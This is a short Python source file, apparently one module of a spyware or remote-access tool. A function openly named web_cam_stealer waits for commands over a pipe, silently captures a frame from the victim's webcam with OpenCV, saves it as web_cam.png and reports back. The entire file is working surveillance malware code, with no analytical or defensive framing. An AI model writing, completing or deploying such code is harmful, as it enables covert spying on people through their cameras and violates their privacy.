import cv2
import pickle

def get_frame():    
    video_capture = cv2.VideoCapture(0)
    
    success = False
    
    if video_capture.isOpened():
        # Read picture. ret === True on success
        ret, frame = video_capture.read()
        
        cv2.imwrite("web_cam.png", frame)
        
        success = True
        
    video_capture.release()
    cv2.destroyAllWindows()
    
    return success

def web_cam_stealer(pipe):
    while True:
        while pipe.poll():
            command = pipe.recv()
            if command == "get_frame":
                success = get_frame()
                
                if success:
                    pipe.send("success")
                else:
                    pipe.send("fail")